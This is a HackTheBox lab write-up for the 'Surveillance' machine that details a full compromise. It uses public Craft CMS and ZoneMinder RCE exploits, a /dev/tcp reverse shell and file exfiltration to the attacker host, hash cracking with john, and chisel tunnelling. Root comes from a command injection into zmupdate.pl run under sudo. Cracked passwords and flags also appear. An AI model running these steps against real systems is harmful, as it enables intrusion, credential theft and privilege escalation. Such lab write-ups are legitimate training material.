---
layout: writeup
category: HTB
title: HTB Surveillance writeup
points: 30
solves: 6553
tags: craft_cms hash_cracking zoneminder_exploit sudoers abusing_zmupdate.pl
date: 2024-04-17
comments: false
description: In this machine, we have a web service vulnerable to RCE of [Craft CMS 4.4.14 exploit](https://github.com/Faelian/CraftCMS_CVE-2023-41892) that give us access to www-data. Next, we can see the hash of matthew in a sql file and crack it to give us the password. Then, we can see a port opened on localhost that has a web service running a zoneminder video surveillance software system version which is vulnerable to [RCE](https://github.com/rvizx/CVE-2023-26035) and give us access to zoneminder user. Last, we have a sudoers privilege on zoneminder user that let us run any perl script related to zoneminder like root. We can exploit it because one script has the --user parameter to execute a command without any validations that let us inject a command in the --user parameter.
---

In this machine, we have a web service vulnerable to RCE of [Craft CMS 4.4.14 exploit](https://github.com/Faelian/CraftCMS_CVE-2023-41892) that give us access to www-data. Next, we can see the hash of matthew in a sql file and crack it to give us the password. Then, we can see a port opened on localhost that has a web service running a zoneminder video surveillance software system version which is vulnerable to [RCE](https://github.com/rvizx/CVE-2023-26035) and give us access to zoneminder user. Last, we have a sudoers privilege on zoneminder user that let us run any perl script related to zoneminder like root. We can exploit it because one script has the --user parameter to execute a command without any validations that let us inject a command in the --user parameter.
# Enumeration

First, we start with a basic port scanning:

```python
❯ sudo nmap -sVC -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.245 -oN tcpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:24 CEST
Nmap scan report for 10.10.11.245
Host is up (0.10s latency).
Not shown: 59911 closed tcp ports (reset), 5622 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.43 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a real environment).
* -n: Disables DNS resolution protocol.
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

We see the port 22 and 80. Also, we have the domain surveillance.htb so I will add it to the /etc/hosts. Since we don't have credentials because we are in the recon phase, let's enumerate the port 80.

## Web enumeration

In this step, I will launch whatweb to recognize a little bit the web.

```plaintext
❯ whatweb http://surveillance.htb
http://surveillance.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

We can see that is powered by Craft CMS and if we look in the source page of the web we can see that it's version 4.4.14:

![4.4.14](/assets/images/Surveillance/version-4.4.14.png)

Now if we search in google for exploits for this version, we can see [this page](https://github.com/Faelian/CraftCMS_CVE-2023-41892) that has a exploit written in python which we can run to obtain RCE:

```plaintext
❯ git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892
Cloning into 'CraftCMS_CVE-2023-41892'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 16 (delta 2), reused 9 (delta 0), pack-reused 0
Receiving objects: 100% (16/16), 82.87 KiB | 684.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.
❯ cd CraftCMS_CVE-2023-41892
❯ ls
craft-cms.py  exploit.png  README.md
❯ python3 craft-cms.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> whoami
www-data

>
```

# Access as www-data

Now i will establish a reverse shell by spawning a nc listener and executing the command `bash -c "bash -i >& /dev/tcp/<YOUR IP>/<YOUR PORT> 0>&1"`

![Shell](/assets/images/Surveillance/shell.png)

And now i will stabilize the tty for doing ctrl+c, ctrl+l, etc:

```plaintext
www-data@surveillance:~/html/craft/web$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@surveillance:~/html/craft/web$ ^Z
[1]  + 98485 suspended  nc -lvnp 443
❯ stty raw -echo;fg
[1]  + 98485 continued  nc -lvnp 443
                                    reset xterm
www-data@surveillance:~/html/craft/web$ export TERM=xterm
www-data@surveillance:~/html/craft/web$ export SHELL=bash
www-data@surveillance:~/html/craft/web$ stty rows <YOUR TERMINAL ROWS> columns <YOUR TERMINAL COLUMNS>
```

* ``script /dev/null -c bash``: Spawns a tty.
* ``ctrl+z``: puts the shell in background for later doing a treatment.
* ``stty raw -echo;fg``: give us the shell back again.
* ``reset xterm``: resets the terminal to give us the bash console.
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal.
* ``export SHELL=bash``: specifies the system that we are using a bash console.
* ``stty rows <YOUR ROWS> columns <YOUR COLUMNS>``: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine.

# Access as matthew

Let's see the users that have a shell in this machine:

```plaintext
www-data@surveillance:~/html/craft$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
```

Without root, we have matthew and zoneminder.

Now I will search for configuration files in the webroot that has credentials for some user.

In /var/www/html/craft/.env we can see credentials for connection to the MySQL database of the user craftuser. When we access as that user in the database, we see an admin hash but it seems that isn't crackable.

Now if we look in `/var/www/html/craft/storage/backups`, we have a zip, let's transfer it to my machine using `cat [FILE TO TRANSFER] > /dev/tcp/<YOUR IP>/<YOUR LISTENING PORT>`.

![Transfering SQL backup](/assets/images/Surveillance/transfer_sql_backup.png)

Next, I will proceed to unzip it and inspect it:

```plaintext
❯ unzip surveillance_backup.zip
Archive:  surveillance_backup.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql  
❯ file surveillance--2023-10-17-202801--v4.4.14.sql
surveillance--2023-10-17-202801--v4.4.14.sql: ASCII text
```

Let's grep for the command "INSERT INTO" to see which values are inserted in the tables and see if we can retrieve some hash of some user:

```plaintext
❯ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep "INSERT INTO"
<SNIP>
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
<SNIP>
```

We have a hash for the user matthew, now let's crack it:
```plaintext
❯ john -w=/usr/share/wordlists/rockyou.txt matthew.hash --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
starcraft122490  (?)     
1g 0:00:00:00 DONE (2024-04-17 19:11) 3.225g/s 11627Kp/s 11627Kc/s 11627KC/s stefon23..sozardme
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Now, we can migrate to that user and see user.txt:

```bash
www-data@surveillance:~/html/craft/storage/backups$ su matthew
Password: starcraft122490 
matthew@surveillance:/var/www/html/craft/storage/backups$ whoami
matthew
matthew@surveillance:/var/www/html/craft/storage/backups$ cd /home/matthew/
matthew@surveillance:~$ cat user.txt
e11642e5faad074f8c3ee154d53609df
```

# Access as zoneminder

If we see the services running on localhost in the machine, we can see that there is another web service running on port 8080:

```bash
matthew@surveillance:~$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

I will forward it to my machine with [chisel](https://github.com/jpillora/chisel):

## Transfer

In the attacker's machine:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In the victim's machine:

```bash
matthew@surveillance:~$ cd /tmp
matthew@surveillance:/tmp$ wget http://<YOUR IP>/chisel
```

## Port forwarding

In the attacker's machine:

```bash
❯ ./chisel server -p 1234 --reverse
2024/04/17 19:32:17 server: Reverse tunnelling enabled
2024/04/17 19:32:17 server: Fingerprint Jxtsiq9PliwT2OzxzND0lOoMiHcCBqwuSN8Q6i3q5cg=
2024/04/17 19:32:17 server: Listening on http://0.0.0.0:1234
2024/04/17 19:32:46 server: session#6: tun: proxy#R:8080=>8080: Listening
```

In the victim's machine:

```bash
matthew@surveillance:/tmp$ ./chisel client 10.10.14.114:1234 R:8080:127.0.0.1:8080
2024/04/17 17:32:45 client: Connecting to ws://10.10.14.114:1234
2024/04/17 17:32:46 client: Connected (Latency 94.27049ms)
```

## Enumeration

Enumerating the 8080 web service, we can see that it runs something called "zoneminder":

![Zoneminder](/assets/images/Surveillance/zoneminder_cms.png)

Searching in google, we can see that Zoneminder is a video surveillance software system:

![Zoneminder search](/assets/images/Surveillance/zoneminder_search.png)

Looking for exploits on google, we found [this](https://github.com/rvizx/CVE-2023-26035) one that says to exploit an RCE:

![Zoneminder exploit page](/assets/images/Surveillance/zoneminder_exploit_page.png)

Now let's execute it:

```bash
❯ nc -lvnp 443
❯ git clone https://github.com/rvizx/CVE-2023-26035
❯ cd CVE-2023-26035
❯ python3 exploit.py -t http://localhost:8080 -ip 10.10.14.114 -p 443
```

![RCE as zoneminder](/assets/images/Surveillance/rce_as_zoneminder.png)

And remember to stabilize the TTY as before

# Access as root

Looking at the sudo privileges we can see that we can run any zoneminder perl script under /usr/bin/

```bash
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

We can see the password of zoneminder user for the MySQL database in `/usr/share/zoneminder/www/api/Config/database.php`

```php
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat database.php
<?php
<SNIP>
class DATABASE_CONFIG {

	/*public $default = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'login' => ZM_DB_USER,
		'password' => ZM_DB_PASS,
		'database' => ZM_DB_NAME,
		'ssl_ca' => ZM_DB_SSL_CA_CERT,
		'ssl_key' => ZM_DB_SSL_CLIENT_KEY,
		'ssl_cert' => ZM_DB_SSL_CLIENT_CERT,
		'prefix' => '',
		'encoding' => 'utf8',
	);*/

	public $test = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'host' => 'localhost',
		'login' => 'zmuser',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
		'prefix' => '',
		//'encoding' => 'utf8',
	);

	public function __construct() {
		if (strpos(ZM_DB_HOST, ':')):
			$array = explode(':', ZM_DB_HOST, 2);
                        if (ctype_digit($array[1])):
				$this->default['host'] = $array[0];
				$this->default['port'] = $array[1];
			else:
				$this->default['unix_socket'] = $array[1];
			endif;
		else:
			$this->default['host'] = ZM_DB_HOST;
		endif;
	}
}
```

Looking at the perl scripts, we can see that the script zmupdate.pl uses the --pass parameter (line 416) to execute the command mysql escaping it with quotes which is a nice sanitization. But the --user parameter (line 415) is used without any validations so it is vulnerable to command injection in the --user parameter:

![zmupdate vulnerable](/assets/images/Surveillance/zmupdate_vulnerable_rce.png)

And now, with the password, we can exploit it in the zmupdate.pl --user parameter:

```bash
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/Config$ sudo /usr/bin/zmupdate.pl --version 1 --user='$(chmod u+s /bin/bash)' --pass='ZoneMinderPassword2023'

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
mysqldump: Got error: 1698: "Access denied for user '-pZoneMinderPassword2023'@'localhost'" when trying to connect
Output: 
Command 'mysqldump -u$(chmod u+s /bin/bash) -p'ZoneMinderPassword2023' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-1.dump' exited with status: 2
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/Config$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# cat root.txt 
50a1b0211164d8fcfbf20dca6ab3f88d
```

That is all. Hope you liked it!
